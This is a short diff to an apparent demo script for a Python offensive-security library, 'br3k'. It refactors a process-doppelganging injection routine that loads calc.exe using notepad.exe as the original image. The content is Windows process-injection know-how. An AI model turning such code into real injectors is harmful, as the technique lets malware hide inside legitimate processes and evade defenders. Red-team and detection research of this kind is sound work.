@@ -1,5 +1,5 @@
 import br3k
-from br3k import ProcessMemoryStrategy, FsFileMode, FsSectionMode
+from br3k import ProcessVmStrategy, FsFileMode, FsSectionMode
 
 ORIGINAL_IMAGE_FILEPATH = "C:\\Windows\\notepad.exe"
 INJECTED_IMAGE_FILEPATH = "C:\\Windows\\System32\\calc.exe"
@@ -10,7 +10,7 @@ if __name__ == "__main__":
     print("Script: Inject via process doppelganging")
     print()
 
-    br3k.init_sysapi(ntdll_copy=True)
+    br3k.init_sysapi()
 
     injected_image = br3k.FileMapping(INJECTED_IMAGE_FILEPATH)
 
@@ -35,7 +35,7 @@ if __name__ == "__main__":
 
     process = br3k.Process(
         section_handle=section_handle,
-        memory_strategy=ProcessMemoryStrategy.AllocateInAddr
+        memory_strategy=ProcessVmStrategy.AllocateInAddr
     )
 
     process.create()
@@ -53,6 +53,7 @@ if __name__ == "__main__":
     )
 
     peb = process.read_peb()
-    process.create_thread(ep=peb.ImageBaseAddress + injected_pe.ep_address())
+    thread = br3k.Thread(process)
+    thread.create(ep=peb.ImageBaseAddress + injected_pe.ep_address())
 
     br3k.script_success()
